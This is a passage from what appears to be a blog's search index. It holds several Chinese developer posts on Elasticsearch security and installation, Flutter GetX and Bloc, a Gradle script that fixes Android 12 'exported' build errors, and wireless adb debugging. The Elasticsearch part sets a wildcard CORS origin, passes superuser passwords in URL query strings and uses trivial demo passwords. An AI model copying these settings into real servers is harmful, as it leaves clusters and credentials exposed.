certs/elastic-certificates.p12 其它配置（可选） 1234#跨域配置http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;http.cors.allow-headers: Authorization,X-Requested-With,Content-Length,Content-Type 注：若是集群环境则需要将证书文件目录，以及配置文件，在所有集群环境下都修改一下。 # 3.3. 重启生效 需要重启 elasticsearch 注：若是集群环境下则需要启动所有集群节点，再统一设置密码 注：重启异常情况，若出现报错，类似 failed to load plugin class [org.elasticsearch.xpack.core.XPackPlugin] 请检查是否是使用 root 用户生成的证书，启动用户无权限导致。 # 4. 设置用户密码 执行设置用户名和密码的命令，内置了部分用户 切换到 elasticsearch 安装文件目录 bin 下 ：示例：/usr/local/elasticsearch-7.4.0/bin/ 12# 手动配置每个用户密码模式（需要一个一个的输入）./elasticsearch-setup-passwords interactive 也可以先自动配置密码后续再修改 12#自动配置每个用户密码（随机生成并返回字符串密码,需要保存好）./elasticsearch-setup-passwords auto 下图 1 是自动生成密码情况（一定拷贝下来要牢记密码） 下图 2 是自定义密码情况 分别为多个用户设置密码例如：elastic, kibana, logstash_system,beats_system, 设置密码的时候需要连续输入 2 遍。 部分内置账号的角色权限解释如下： elastic 账号：拥有 superuser 角色，是内置的超级用户。 kibana 账号：拥有 kibana_system 角色，用户 kibana 用来连接 elasticsearch 并与之通信。Kibana 服务器以该用户身份提交请求以访问集群监视 API 和 .kibana 索引。不能访问 index。 logstash_system 账号：拥有 logstash_system 角色。用户 Logstash 在 Elasticsearch 中存储监控信息时使用。 至此单节点安全配置完毕，重启 es 后访问 9200 会出现用户名和密码的提示窗口，我们就可以通过用户生成的密码过行访问了 # 5. 测试访问 通过查看证书方式，顺便测试一下密码是否生效了 浏览器输入 http://IP:9200/_license 可以看到，弹窗出来，需要输入密码了 # 附录：常见问题 # 1. 如何修改账号密码 以 elastic 账号为例，注意需要在 elasticsearch 服务已启动的情况下进行 1curl -H 'Content-Type: application/json' -u elastic:123456 -XPUT 'http://localhost:9200/_xpack/security/user/elastic/_password' -d '{ &quot;password&quot; : &quot;1234567&quot; }' # 2. 客户端 ES-HEAD 连接问题 连接失败情况下先检查是否是跨域问题 123http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;http.cors.allow-headers: Authorization,X-Requested-With,Content-Length,Content-Type 例如下图连接的时候报错未授权 解决方案：在访问的 URL 中拼接授权账号信息 示例：?auth_user=elastic&amp;auth_password=1234567 示例：指定服务端地址以及账户 1http://IP:9100/?base_uri=http://IP:9200&amp;auth_user=elastic&amp;auth_password=1234567 # 3. 启动报 XPACK 相关错 DecoderException: javax.net.ssl.SSLHandshakeException: No available authentication scheme 解决方案：请通过上文配置步骤，排查，检查证书是否已经配置好，以及配置是否填写正确 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/11/13/%E3%80%90Elasticsearch%E3%80%91Elasticsearch7%E9%85%8D%E7%BD%AE%E8%AF%81%E4%B9%A6/"},{"title":"Flutter GETX框架","text":"​ GetX 是 Flutter 上的一个轻量且强大的解决方案：高性能的状态管理、智能的依赖注入和便捷的路由管理。 ​ 与其说是一个状态管理库，倒不如是是一个简化 Flutter 开发的百宝箱。它提供了很多工具来简化我们的开发，本篇我们先对 GetX 有一个大概的认识，然后接下来的篇章再将 GetX 的具体应用。 # GetX 工具介绍 官方文档给出关于 GetX 的介绍如下： GetX is an extra-light and powerful solution for Flutter. It combines high-performance state management, intelligent dependency injection, and route management quickly and practically. GetX 是一个超轻量且强大的 Flutter 应用解决方案。它组合了高性能的状态管理、智能的依赖注入以及快速可用的路由管理。 而实际上，GetX 还有更多的小工具，示例如下： # 状态管理 Obx 是配合 Rx 响应式变量使用、GetBuilder 是配合 update 使用：请注意，这完全是俩套定点刷新控件的方案。 区别：前者响应式变量变化，Obx 自动刷新；后者需要使用 update 手动调用刷新 每一个响应式变量，都需要生成对应的 GetStream，占用资源大于基本数据类型，会对内存造成一定压力 GetBuilder 内部实际上是对 StatefulWidget 的封装，所以占用资源极小（推荐使用） # 控制器的注入 静态路由绑定 123456789101112131415class AsWorkStatisticsBinding implements Bindings { @override void dependencies() { Get.lazyPut&lt;AsWorkStatisticsController&gt;(() =&gt; AsWorkStatisticsController()); }}static final List&lt;GetPage&gt; routes = [ GetPage( name: workStatisticsPage, page: () =&gt; const AsWorkStatisticsPage(), binding: AsWorkStatisticsBinding(), ),];Get.toNamed(ASRouteConfig.workPlanDetailPage); 动态路由绑定 1Get.to(AsWorkStatisticsPage(),binding: AsWorkStatisticsBinding()); 页面注入 1Get.lazyPut&lt;AsWorkStatisticsController&gt;(() =&gt; AsWorkStatisticsController()); # 动态 / 简单路由和静态 / 命名路由 请注意命名路由，只需要在 api 结尾加上 Named 即可，举例： 默认：Get.to(SomePage()); 命名路由：Get.toNamed (“/somePage”); 导航到新的页面 12Get.to(NextScreen());Get.toNamed(&quot;/NextScreen&quot;); 关闭 SnackBars、Dialogs、BottomSheets 或任何你通常会用 Navigator.pop (context) 关闭的东西 1Get.back(); 进入下一个页面，但没有返回上一个页面的选项（用于 SplashScreens，登录页面等） 12Get.off(NextScreen());Get.offNamed(&quot;/NextScreen&quot;); 进入下一个界面并取消之前的所有路由（在购物车、投票和测试中很有用） 12Get.offAll(NextScreen());Get.offAllNamed(&quot;/NextScreen&quot;); 发送数据到其它页面 只要发送你想要的参数即可。Get 在这里接受任何东西，无论是一个字符串，一个 Map，一个 List，甚至一个类的实例。 12Get.to(NextScreen(), arguments: 'Get is the best');Get.toNamed(&quot;/NextScreen&quot;, arguments: 'Get is the best'); 在你的类或控制器上。 12print(Get.arguments);//print out: Get is the best 要导航到下一条路由，并在返回后立即接收或更新数据 12var data = await Get.to(Payment());var data = await Get.toNamed(&quot;/payment&quot;); 在另一个页面上，发送前一个路由的数据 123Get.back(result: 'success');// 并使用它，例：if(data == 'success') madeAnything(); 跳转重复页面，可以这样写 123Get.to(XxxxPage(), preventDuplicates: false);// 或者Get.toNamed('xxx', preventDuplicates: false); 如果你不想使用 GetX 语法，只要把 Navigator（大写）改成 navigator（小写），你就可以拥有标准导航的所有功能，而不需要使用 context，例如： 123456789101112131415161718192021// 默认的Flutter导航Navigator.of(context).push( context, MaterialPageRoute( builder: (BuildContext context) { return HomePage(); }, ),);// 使用Flutter语法获得，而不需要context。navigator.push( MaterialPageRoute( builder: (_) { return HomePage(); }, ),);// get语法Get.to(HomePage()); # GetView 的使用 GetView 只是对已注册的 Controller 有一个名为 controller 的 getter 的 const Stateless 的 Widget，如果我们只有单个控制器作为依赖项，那我们就可以使用 GetView，而不是使用 StatelessWidget，并且避免了写 Get.Find ()。 GetView 的使用方法非常简单，只是要将你的视图层继承自 GetView 并传入需要注册的控制器并 Get.put () 即可： 123456789class GetViewAndGetWidgetExample extends GetView&lt;GetViewCountController&gt; { @override Widget build(BuildContext context) { Get.put(GetViewCountController()); return Container(); }} # 路由 路由支持命名路由和匿名路由： 1234567891011Get.to(() =&gt; Home());Get.toNamed('/home');// 返回上一个页面Get.back();// 使用下一个页面替换Get.off(NextScreen());// 清空导航堆栈全部页面Get.offAll(NextScreen());// 获取命名路由参数print(Get.parameters['id']);print(Get.parameters['name']); GetX 的路由好处是不依赖于 context ，十分简洁，更多路由介绍可以参考：GetX 路由介绍官方文档。 # SnackBar Flutter 自身携带的 SnackBar 有很多限制，而 GetX 的非常简单，当然也有更多的样式配置和位置配置参数。 1Get.snackbar('SnackBar', '这是GetX的SnackBar'); # 对话框 对话框也一样，默认的对话框开箱即用。 1234567891011Get.defaultDialog( title: '对话框', content: Text('对话框内容'), onConfirm: () { print('Confirm'); Get.back(); }, onCancel: () { print('Cancel'); },); # 内存缓存 GetX 可以缓存内容对象，以便在不同页面共享数据。使用的时候需要注意，需要先 put 操作再 find 操作，否则会抛异常。 12Get.put(CacheData(name: '这是缓存数据'));CacheData cache = Get.find(); # 离线存储 GetX 提供了一个 get_storage 插件用于离线存储，与 shared_preferences 相比，其优点是纯 Dart 编写，不依赖于原生，因此可以在安卓、iOS、Web、Linux、Mac 等多个平台使用。 GetStorage 是基于内存和文件存储的，当内存容器中有数据时优先从内存读取。同时在构建 GetStorage 对象到时候指定存储的文件名以及存储数据的容器。 123GetStorage storage = GetStorage();storage.write('name', '岛上码农');storage.read('name'); # 更改主题 可以说是一行代码搞定深色和浅色模式，也可以更改为自定义主题 —— 老板让你根据手机壳改主体颜色的需求已经搞定了一大半了！ 123Get.changeTheme( Get.isDarkMode ? ThemeData.light() : ThemeData.dark());}, # 多语言支持 多语言支持使用数据字典完成，在 GetMaterialApp 指定字典对象（继承自 Translations ），使用字符串的时候假设 .tr 后缀，就可以在切换语言的时候自动切换字符串对应语言的翻译了。 1234567891011121314151617181920212223242526272829303132333435363738394041class GetXDemo extends StatelessWidget { // 省略其他代码 TextButton( onPressed: () { var locale = Locale('en', 'US'); Get.updateLocale(locale); }, child: Text('name'.tr), ),}class Messages extends Translations { @override Map&lt;String, Map&lt;String, String&gt;&gt; get keys =&gt; { 'en_US': { 'name': 'Island Coder', }, 'zh_CN': { 'name': '岛上码农', } };}class MyApp extends StatelessWidget { // This widget is the root of your application. @override Widget build(BuildContext context) { return GetMaterialApp( translations: Messages(), locale: Locale('zh', 'CN'), color: Colors.white, navigatorKey: Get.key, title: 'Flutter Demo', theme: ThemeData( primarySwatch: Colors.blue, brightness: Brightness.light, ), home: GetXDemo(), ); }} # GetX 的理念 GetX 有三个基本的理念，分别是性能、生产力和组织性（Organization）。 性能（Performance）：GetX 关注性能并最小化资源消耗。GetX 不使用 Stream 或 ChangeNotifier 。 生产力（Productivity）：GetX 使用简洁愉悦的语法。不管你要做什么，使用 GetX 都会觉得简便。这使得开发的时间大大节省，并且保证应用性能的最大化。通常来说，开发者需要关注从内存中移除控制器。而使用 GetX 的时候，则无需这么做。当控制器不被使用的时候，资源会自动从内存中释放。如果确实需要常住内存，那就需要在依赖中声明 permanent:true 。通过这种方式，可以降低内存中有过多不必要依赖对象的风险。同时，依赖默认也是懒加载。 组织性（Organization）：GetX 可以将视图、展示逻辑、业务逻辑、依赖注入和导航完全解耦。路由之间跳转无需 context ，因此我们的导航不会依赖组件树。也不需要使用通过 InheritedWidget 的 context 访问控制器或 BLOC 对象，因此可以将展示逻辑和业务逻辑从虚拟的组件层分离。我们也不需要像 MultiProvider 那样往组件树中注入 Controller/Model/Bloc 等类对象。因此可以将依赖注入和视图分离。 # GetX 生态 GetX 有很多特性，使得编码变得容易。每个特性之间是相互独立的，并且只会在使用的时候才启动。例如，如果仅仅是使用状态管理，那么只有状态管理会被编译。而如果只使用路由，那么状态管理的部分就不会编译。 GetX 有一个很大的生态，包括了大型的社区维护，大量的协作者（GitHub 上看有 132 位），并且承诺只要 Flutter 存在就会继续维护下去。而且 GetX 兼容 Android, iOS, Web, Mac, Linux, Windows 多个平台。GetX 甚至还有服务端版本 Get_Server（感觉 Flutter 要一统程序员界啊，啥时候支持鸿蒙？）。 为了简化开发，GetX 还提供了脚手架工具 **GET_CLI** 和 VSCode 插件 GetX Snippets （也有 Android Studio 和 Intellij 插件）。提供了如下快速代码模板： getmain：GetX 的 main.dart 代码； getmodel：Model 类代码，包括了 fromJson 和 toJson 方法 其他，输入 getxxxx 根据提示生成即可，具体参考：GetX Snippets 介绍。 # 总结 本篇对 GetX 插件做了简单的介绍，可以看到 GetX 的生态确实很丰富，感觉是一个集大成者，GetX 基本上涵盖了 Flutter 应用开发的很大一部分，如路由、主题、多语言、弹层、状态管理、依赖注入、网络请求封装等等。GetX 看着像一个框架， 但实际上它的各个模块是独立的，其实是一个工具箱。对于开发的时候，可以用它的全家桶，也可以从中任取所需的模块到我们的应用中使用。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/01/12/%E3%80%90Flutter%E3%80%91Flutter_GetX%E6%96%87%E6%A1%A3/"},{"title":"【Flutter】Flutter修复Android 12无法构建的问题，自动适配 exported 深入解析避坑.md","text":"# 【Flutter】Flutter 修复 Android 12 无法构建的问题，自动适配 exported 深入解析避坑 【摘要】 众所周知，从 Android 12 开始，使用了 TargetSDK 31 之后，四大组件如果使用了 intent-filter， 但是没显性质配置 exported App 将会无法安装，甚至编译不通过… 比如启动的 Activity 就需要设置 exported 为 true ，至于其他组件是否设置为 true 则看它是否需要被其它应用调用。 # 然而这个事情的状态是这样的: 如果出现问题的 AndroidManifest 文件是你本地的，那手动修改即可； 但如果出现问题的是第三方远程依赖，并且对方并没有提供源码和更新，你就无法直接修改； 如果第三方依赖太多，查找哪些出了问题十分费时费力。 # 脚本 所以在之前的 《Android 12 快速适配要点》 一文中提供了一套脚本，专门用于适配 Android 12 下缺少 android:exported 无法编译或者安装的问题，但是在这期间收到了不少问题反馈： # com.android.tools.build:gradle:4.0.0 以及其下版本 一下脚本经过测试最高可到支持的版本： gradle:4.0.0 &amp; gradle-6.1.1-all.zip 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * 修改 Android 12 因为 exported 的构建问题 */android.applicationVariants.all { variant -&gt; variant.outputs.all { output -&gt; output.processResources.doFirst { pm -&gt; String manifestPath = output.processResources.manifestFile def manifestFile = new File(manifestPath) def xml = new XmlParser(false, true).parse(manifestFile) def exportedTag = &quot;android:exported&quot; ///指定 space def androidSpace = new groovy.xml.Namespace('http://schemas.android.com/apk/res/android', 'android') def nodes = xml.application[0].'*'.findAll { //挑选要修改的节点，没有指定的 exported 的才需要增加 (it.name() == 'activity' || it.name() == 'receiver' || it.name() == 'service') &amp;&amp; it.attribute(androidSpace.exported) == null } ///添加 exported，默认 false nodes.each { def isMain = false it.each { if (it.name() == &quot;intent-filter&quot;) { it.each { if (it.name() == &quot;action&quot;) { if (it.attributes().get(androidSpace.name) == &quot;android.intent.action.MAIN&quot;) { isMain = true println(&quot;......................MAIN FOUND......................&quot;) } } } } } it.attributes().put(exportedTag, &quot;${isMain}&quot;) } PrintWriter pw = new PrintWriter(manifestFile) pw.write(groovy.xml.XmlUtil.serialize(xml)) pw.close() } }} # com.android.tools.build:gradle:4.0.0 以上版本 以下脚本经过测试支持的版本： gradle:4.1.0 &amp; gradle-6.5.1-all.zip 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/** * 修改 Android 12 因为 exported 的构建问题 */android.applicationVariants.all { variant -&gt; variant.outputs.each { output -&gt; def processManifest = output.getProcessManifestProvider().get() processManifest.doLast { task -&gt; def outputDir = task.multiApkManifestOutputDirectory File outputDirectory if (outputDir instanceof File) { outputDirectory = outputDir } else { outputDirectory = outputDir.get().asFile } File manifestOutFile = file(&quot;$outputDirectory/AndroidManifest.xml&quot;) println(&quot;----------- ${manifestOutFile} ----------- &quot;) if (manifestOutFile.exists() &amp;&amp; manifestOutFile.canRead() &amp;&amp; manifestOutFile.canWrite()) { def manifestFile = manifestOutFile ///这里第二个参数是 false ，所以 namespace 是展开的，所以下面不能用 androidSpace，而是用 nameTag def xml = new XmlParser(false, false).parse(manifestFile) def exportedTag = &quot;android:exported&quot; def nameTag = &quot;android:name&quot; ///指定 space //def androidSpace = new groovy.xml.Namespace('http://schemas.android.com/apk/res/android', 'android') def nodes = xml.application[0].'*'.findAll { //挑选要修改的节点，没有指定的 exported 的才需要增加 //如果 exportedTag 拿不到可以尝试 it.attribute(androidSpace.exported) (it.name() == 'activity' || it.name() == 'receiver' || it.name() == 'service') &amp;&amp; it.attribute(exportedTag) == null } ///添加 exported，默认 false nodes.each { def isMain = false it.each { if (it.name() == &quot;intent-filter&quot;) { it.each { if (it.name() == &quot;action&quot;) { //如果 nameTag 拿不到可以尝试 it.attribute(androidSpace.name) if (it.attributes().get(nameTag) == &quot;android.intent.action.MAIN&quot;) { isMain = true println(&quot;......................MAIN FOUND......................&quot;) } } } } } it.attributes().put(exportedTag, &quot;${isMain}&quot;) } PrintWriter pw = new PrintWriter(manifestFile) pw.write(groovy.xml.XmlUtil.serialize(xml)) pw.close() } } }} 这段脚本你可以直接放到 app/build.gradle 下执行，也可以单独放到一个 gradle 文件之后 apply 引入，它的作用就是： 在打包过程中检索所有没有设置 exported 的组件，给他们动态配置上 exported ，这里有个特殊需要注意的是，因为启动 Activity 默认就是需要被 Launcher 打开的，所以 &quot;android.intent.action.MAIN&quot; 需要 exported 设置为 true 。（PS：更正规应该是用 LAUNCHER 类别，这里故意用 MAIN） 而后综合问题，具体反馈的问题有 ： label 直接写死中文，不是引用 @string 导致的在 3.x 的版本可以正常运行，但不能打包 ； XmlParser 类找不到，这个首先确定 AGP 版本和 Gradle 版本是否匹配，具体可见 gradle-plugin，另外可以通过 groovy.util.XmlParser 或者 groovy.xml.XmlParser 全路径指定使用 ，如果是 gradle 文件里显示红色并不会影响运行； 运行报错提示 android:exported needs ，这个就是今天需要输入聊的； 1234Error: android:exported needs to be explicitly specified for &lt;xxxx&gt;. Apps targeting Android 12 and higher are required to specify an explicit value for `android:exported` when the corresponding component has an intent filter defined. 基于上述脚本测试和反馈，目前的结论是： 从 gradle:4.2.0 &amp; gradle-6.7.1-all.zip 开始，TargetSDK 31 下脚本会有异常，因为在 processDebugMainManifest （带有 Main） 的阶段，会直接扫描依赖库的 AndroidManifest.xml 然后抛出直接报错，从而进不去 processDebugManifest 任务阶段就编译停止，所以实际上脚本并没有成功运行。 所以此时拿不到 mergerd_manifest 下的文件，因为 mergerd_manifest 下 AndroidManifest.xml 也还没创建成功，没办法进入 task ，也就是该脚本目前只能针对 gradle:4.1.0 以及其下版本安装 apk 到 Android12 的机器上， 有 intent-filter 但没有 exoprted 的适配问题，基于这个问题，不知道各位是否有什么好的建议？ # 新脚本 而目前基于这个问题，这里提供了如下脚本，在 gradle:4.2.0 &amp; gradle-6.7.1-all.zip 以及 7.0 的版本上，该脚本的作用是在运行时自动帮你打印出现问题的 aar 包依赖路径和组建名称： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657android.applicationVariants.all { variant -&gt; variant.outputs.each { output -&gt; //println(&quot;=============== ${variant.getBuildType().name.toUpperCase()} ===============&quot;) //println(&quot;=============== ${variant.getFlavorName()} ===============&quot;) def vn if (variant.getFlavorName() != null &amp;&amp; variant.getFlavorName() != &quot;&quot;) { vn = variant.name; } else { if (variant.getBuildType().name == &quot;release&quot;) { vn = &quot;Release&quot; } else { vn = &quot;Debug&quot; } } def taskName = &quot;process${vn}MainManifest&quot;; try { println(&quot;=============== taskName ${taskName} ===============&quot;) project.getTasks().getByName(taskName) } catch (Exception e) { return } ///你的自定义名字 project.getTasks().getByName(taskName).doFirst { //def method = it.getClass().getMethods() it.getManifests().getFiles().each { if (it.exists() &amp;&amp; it.canRead()) { def manifestFile = it def exportedTag = &quot;android:exported&quot; def nameTag = &quot;android:name&quot; ///这里第二个参数是 false ，所以 namespace 是展开的，所以下面不能用 androidSpace，而是用 nameTag def xml = new XmlParser(false, false).parse(manifestFile) if (xml.application != null &amp;&amp; xml.application.size() &gt; 0) { def nodes = xml.application[0].'*'.findAll { //挑选要修改的节点，没有指定的 exported 的才需要增加 //如果 exportedTag 拿不到可以尝试 it.attribute(androidSpace.exported) (it.name() == 'activity' || it.name() == 'receiver' || it.name() == 'service') &amp;&amp; it.attribute(exportedTag) == null } if (nodes.application != null &amp;&amp; nodes.application.size() &gt; 0) { nodes.each { def t = it it.each { if (it.name() == &quot;intent-filter&quot;) { println(&quot;$manifestFile \\n .....................${t.attributes().get(nameTag)}......................&quot;) } } } } } } } } }} 如下图所示，因为目前官方如红色信息内容其实指向并不正确，容易误导问题方向，所以通过上述脚本打印，可以快速查找到问题所在的点，然后通过 tool:replace 临时解决。 具体为什么之前的脚本在高版本 AGP 下无法使用，原因在于新版本在 processDebugMainManifest ，或者说 processXXXXXXMainManifest 的处理逻辑发生了变化，通过找到 processDebugMainManifest 的实现类，可以看到问题出现就是在于 Merging library manifest 。 processDebugMainManifest 的实现在 ProcessApplicationManifest 里，对应路径是 ProcessApplicationManifest -&gt; MainfestHelper mergeManifestsForApplication -&gt; MainfestMerger2 错误是在 Merging library manifest 的阶段出现异常，但是这个阶段的 task 里对于第三方依赖路径的输入，主要是从 private fun computeFullProviderList 方法开始，所以输入到 mergeManifestsForApplication 里的第三方路径是通过这个私有方法生成。 感觉唯一可以考虑操作的就是内部的 manifests 对象去变换路径，但是它是 private ，并且内部并不能很好复写其内容。 另外因为 aar 文件里的 AndroidManifset 是 readOnly ，所以如果真的要修改，感觉只能在输入之前读取到对应 AndroidManifset ， 并生成临时文件，在 manifests 对象中更改其路径来完成，不知道大家有没有什么比较好的思路 。 如果有好的解决办法，后续再更新。 # 最后 最后再说一个坑 ，如果你是低版本 Gradle 可以打包成功，但是运行到 Android12 机器的时候，可能会因为没有 exported 遇到安装失败的问题： 1、如果是模拟器 12，你可能会看到如下所示的错误提示 ，提示上显示还是很直观的， 直接告诉你是 android:exported 的问题： 123456* What went wrong:Execution failed for task ':app:installDebug'.&gt; java.util.concurrent.ExecutionException: com.android.builder.testing.api.DeviceException: com.android.ddmlib.InstallException: INSTALL_PARSE_FAILED_MANIFEST_MALFORMED: Failed parse during installPackageLI: /data/app/vmdl487461761.tmp/base.apk (at Binary XML file line #358): xxxxx.Activity: Targeting S+ (version 31 and above) requires that an explicit value for android:exported be defined when intent filters are present 2、如果你是真机 12，那可能就是这样的提示，提示然是 INSTALL_FAILED_USER_RESTRICTED ，不得不说小米系统这个安装失败很具误导性，比如 minSDK 太高导致无法安装，在小米上也会是 INSTALL_FAILED_USER_RESTRICTED ： 基本上内容就这些，具体如何进一步优化还待后续测试， 所以针对脚本实现，你还有什么问题或者想法，欢迎评论交流 ～ 文章来源: carguo.blog.csdn.net，作者：恋猫 de 小郭，版权归原作者所有，如需转载，请联系作者。 原文链接：carguo.blog.csdn.net/article/details/123438734 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/07/09/%E3%80%90Flutter%E3%80%91Flutter%E4%BF%AE%E5%A4%8DAndroid%2012%E6%97%A0%E6%B3%95%E6%9E%84%E5%BB%BA%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E8%87%AA%E5%8A%A8%E9%80%82%E9%85%8D%20exported%20%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E9%81%BF%E5%9D%91/"},{"title":"Linux环境下安装并启动Elasticsearch7","text":"# Elasticsearch ​ Elasticsearch (ES) 是一个基于 Lucene 构建的开源、分布式、RESTful 接口全文搜索引擎。Elasticsearch 还是一个分布式文档数据库，其中每个字段均是被索引的数据且可被搜索，它能够扩展至数以百计的服务器存储以及处理 PB 级的数据。它可以在很短的时间内在存储、搜索和分析大量的数据。它通常作为具有复杂搜索场景情况下的核心发动机。es 是由 java 语言编写的。 Elasticsearch就是为高可用和可扩展而生的。可以通过购置性能更强的服务器来完成。 Elasticsearch：官方分布式搜索和分析引擎 | Elastichttps://www.elastic.co/cn/elasticsearch/ # # Linux 里部署 ES # 下载地址 ​ 我下载的版本是 ES7.15.1 Elasticsearch 7.15.1 | Elastichttps://www.elastic.co/cn/downloads/past-releases/elasticsearch-7-15-1 # 上传到 Linux ​ 压缩包下载完成后上传到服务器 # 解压软件 ​ 解压到上级目录，然后进行改名 1234# 解压缩tar -zxvf elasticsearch-7.15.1-linux-x86_64.tar.gz -C ../# 改名mv elasticsearch-7.15.1 es-7.15.1 在 /opt 目录下新建 module/es 目录，同时把 es-7.15.1 移到该目录 1mv es-7.15.1 /opt/module/es # 创建用户 ​ 因为安全问题， Elasticsearch 不允许 root 用户直接运行，所以要创建新用户，在 root 用户中创建新用户。 1234useradd es #新增 es 用户passwd es #为 es 用户设置密码userdel -r es #如果错了，可以删除再加chown -R es:es /opt/module/es/es-7.15.1 #文件夹所有者 # 修改配置文件 修改 /root/es-7.15.1/config/elasticsearch.yml 文件。 123456# 加入如下配置cluster.name: elasticsearchnode.name: node-1network.host: 0.0.0.0http.port: 9200cluster.initial_master_nodes: [&quot;node-1&quot;] # 修改 /etc/security/limits.conf 1234# 在文件末尾中增加下面内容# 每个进程可以打开的文件数的限制es soft nofile 65536es hard nofile 65536 # 修改 /etc/sysctl.conf 123# 在文件中增加下面内容# 一个进程可以拥有的 VMA(虚拟内存区域)的数量,默认值为 65536vm.max_map_count=655360 # 重新加载 sysctl -p # 注意： ​ 启动前需要先切换到 es 用户 1su es # 启动 es 1234#启动 进入bin目录：./elasticsearch#后台启动./elasticsearch -d # 测试连接 ​ 浏览器中打开 http:// 服务器 IP:9200/, 出现如下则说明安装成功 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/01/11/%E3%80%90Elasticsearch%E3%80%91Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AE%89%E8%A3%85%E5%B9%B6%E5%90%AF%E5%8A%A8Elasticsearch7/"},{"title":"Flutter开发中使用WIFI真机调试","text":"# Flutter 开发中使用 WIFI 真机调试 # 使用 vscode 开发 flutter，用 wifi 或者 手机热点进行 无线调试过程 # 1. 手机连接 wifi 后在设置中找到 ip 和端口 # 2. 在 vscode 终端输入 adb connect 手机 IP: 手机端口 # 3. 作者在 CSDN 这个烂环境中没找到有用的信息，全是粘贴的，所以希望这篇文章帮助到你，你可以把我的地址列出来，粘贴可以，抄袭可耻！ # 4. 完成以上步骤，手机端应有开启无线调试的提示，记得提前打开开发者模式。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/01/08/%E3%80%90Flutter%E3%80%91Flutter%E5%BC%80%E5%8F%91%E4%B8%AD%E4%BD%BF%E7%94%A8WIFI%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95/"},{"title":"Flutter下加载本地资源GIF，怎么做到每次进入页面都会出现动画效果？","text":"1. 问题：Flutter 加载 GIF 之后，只有第一次进入页面才会执行动画，接下来都不会执行了 2. 原因：因为 Flutter 的图片缓存机制，在第一次加载图片后，会将图片缓存下来，所以再次访问，你看见的还是上次的已经执行完毕的动画 3. 解决：在 dispose 中把 imageCache 用 clear 方法清理掉 1234567891011121314151617181920212223242526String asset = &quot;images/401.gif&quot;;Widget img = Image.asset(&quot;images/401.gif&quot;,key: UniqueKey(),); @override void initState() { super.initState(); //初始化 toast(); } @override void dispose() { super.dispose(); //清理缓存 imageCache!.clear(); } void toast() { DialogUtils.showErrorMessage(&quot;401&quot;, gravity: ToastGravity.CENTER, toastLength: Toast.LENGTH_SHORT); Future.delayed(Duration(seconds: 3), () { DialogUtils.showMessage(&quot;您没有权限访问......&quot;, gravity: ToastGravity.CENTER, toastLength: Toast.LENGTH_LONG); }); } # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/15/%E3%80%90Flutter%E3%80%91Flutter%E9%87%8D%E5%A4%8D%E8%BF%9B%E5%85%A5%E9%A1%B5%E9%9D%A2GIF%E4%B8%8D%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/"},{"title":"【Flutter】Flutter状态管理框架：Bloc的计数器应用示例","text":"# 【Flutter】Flutter 状态管理框架：Bloc 的计数器应用示例 # Flutter 计数器教程 在下面的教程中，我们会使用 Flutter 和 Bloc 库来开发一个计数器应用。 # 核心要点 BlocObserver：用于观察 Bloc 内状态变化的 Widget。 BlocProvider：为它的 children 提供 Bloc 的 Widget。 BlocBuilder：根据新的 state 来绘制对应 Widget 的 Widget。 用 Cubit 替代 Bloc。两者有何不同？ 通过 context.read 来触发 Event⚡。 # 新建项目和配置文件 yaml 我们先新建一个全新的 flutter 应用 1flutter create flutter_counter 将下面代码复制粘贴到 pubspec.yaml 文件中 1234567891011121314151617181920212223242526name: flutter_counterdescription: A new Flutter project.version: 1.0.0+1publish_to: noneenvironment: sdk: &quot;&gt;=2.19.0 &lt;3.0.0&quot;dependencies: bloc: ^8.1.0 flutter: sdk: flutter flutter_bloc: ^8.1.1dev_dependencies: bloc_test: ^9.1.0 flutter_test: sdk: flutter integration_test: sdk: flutter mocktail: ^0.3.0 very_good_analysis: ^3.1.0flutter: uses-material-design: true 安装依赖包 package 1flutter packages get # 项目架构 12345678910111213├── lib│ ├── app.dart│ ├── counter│ │ ├── counter.dart│ │ ├── cubit│ │ │ └── counter_cubit.dart│ │ └── view│ │ ├── counter_page.dart│ │ └── counter_view.dart│ ├── counter_observer.dart│ └── main.dart├── pubspec.lock├── pubspec.yaml 这个应用中我们使用的是功能驱动（feature-driven）的项目结构。这种项目结构可以让我们通过一个个独立的功能来扩展项目。在当前项目中，我们只需要做一个功能（也就是计数器），但是在将来我们可以通过加入更多功能来实现一个复杂的应用。 # BlocObserver 首先，我们需要了解如何创建一个 BlocObserver ， 它将帮助我们观察应用中所有的状态变化. 创建文件 lib/counter_observer.dart : 123456789101112131415161718import 'package:bloc/bloc.dart';/// {@template counter_observer}/// [BlocObserver] for the counter application which/// observes all state changes./// {@endtemplate}class CounterObserver extends 